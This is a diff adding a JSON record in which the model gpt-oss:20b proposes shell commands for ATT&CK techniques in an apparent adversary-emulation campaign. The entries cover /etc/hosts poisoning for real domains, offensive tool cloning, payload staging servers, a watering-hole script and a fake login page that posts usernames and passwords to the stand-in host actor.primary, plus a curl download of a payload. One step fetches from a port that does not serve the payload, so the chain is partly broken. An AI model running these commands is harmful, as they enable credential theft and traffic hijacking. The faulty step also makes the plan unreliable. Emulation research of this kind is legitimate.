@@ -1,0 +1,104 @@
+{
+  "campaign_id": "C0010",
+  "model": "gpt-oss:20b",
+  "sample": 3,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-host-add",
+      "command": "sudo sh -c 'echo \"192.0.2.123 linkedin.com\" >> /etc/hosts'",
+      "target": "actor.primary",
+      "parameters": {
+        "ip": "192.0.2.123",
+        "domain": "linkedin.com"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "dns-host-add-compromised",
+      "command": "sudo sh -c 'echo \"192.0.2.124 shippingcompany.com\" >> /etc/hosts'",
+      "target": "actor.primary",
+      "parameters": {
+        "ip": "192.0.2.124",
+        "domain": "shippingcompany.com"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "create-malware-file",
+      "command": "python3 - <<'PY'\nimport base64\npayload=b\"SUGARUSH malicious payload\"\nwith open('/tmp/sugarush.exe','wb') as f:\n    f.write(payload)\nprint('Created /tmp/sugarush.exe')\nPY",
+      "target": "actor.primary",
+      "parameters": {
+        "filename": "/tmp/sugarush.exe",
+        "payload": "SUGARUSH malicious payload"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "clone-tool-repo",
+      "command": "git clone https://github.com/rapid7/metasploit-framework.git /opt/metasploit\n\ngit clone https://github.com/unicorn-project/unicorn.git /opt/unicorn\n\ngit clone https://github.com/northstar-c2/northstar.git /opt/northstar",
+      "target": "actor.primary",
+      "parameters": {
+        "repos": [
+          "https://github.com/rapid7/metasploit-framework.git",
+          "https://github.com/unicorn-project/unicorn.git",
+          "https://github.com/northstar-c2/northstar.git"
+        ]
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "http-server-malware",
+      "command": "python3 -m http.server 8080 --directory /tmp & echo $! > /tmp/http_server.pid",
+      "target": "actor.primary",
+      "parameters": {
+        "dir": "/tmp",
+        "port": 8080
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "http-server-tool",
+      "command": "python3 -m http.server 8081 --directory /opt/metasploit & echo $! > /tmp/http_tool.pid",
+      "target": "actor.primary",
+      "parameters": {
+        "dir": "/opt/metasploit",
+        "port": 8081
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "watering-hole-page",
+      "command": "cat <<'HTML'>/var/www/html/index.html\n<html><body>\n<script>\nfetch('http://actor.primary:9000/report', {method:'POST', body:new URLSearchParams({'userAgent':navigator.userAgent,'referrer':document.referrer})});\n</script>\nLogin page placeholder.\n</body></html>\nHTML",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "report_url": "http://actor.primary:9000/report"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "compromise-login-page",
+      "command": "sudo sh -c 'echo \"192.0.2.124 shippingcompany.com\" >> /etc/hosts'\n# Serve malicious login page\ncat <<'HTML'>/var/www/shipping/index.html\n<html><body>\n<form action='/login'><input type='text' name='user'/><input type='password' name='pass'/></form>\n<script>fetch('http://actor.primary:9000/report', {method:'POST', body:new URLSearchParams({'username':document.querySelector(\"[name=user]\").value,'password':document.querySelector(\"[name=pass]\").value})});</script>\n</body></html>\nHTML",
+      "target": "target.primary",
+      "parameters": {
+        "domain": "shippingcompany.com",
+        "malicious_page": "/var/www/shipping/index.html"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "download-tool",
+      "command": "curl http://actor.primary:8081/sugarush.exe -o /tmp/sugarush.exe && echo 'Downloaded to /tmp/sugarush.exe'",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://actor.primary:8081/sugarush.exe",
+        "destination": "/tmp/sugarush.exe"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "bb92eed513a4d31ba30dbb7dcd87d2562f82330763460a2c336334a1f1ba6d2d"
+}
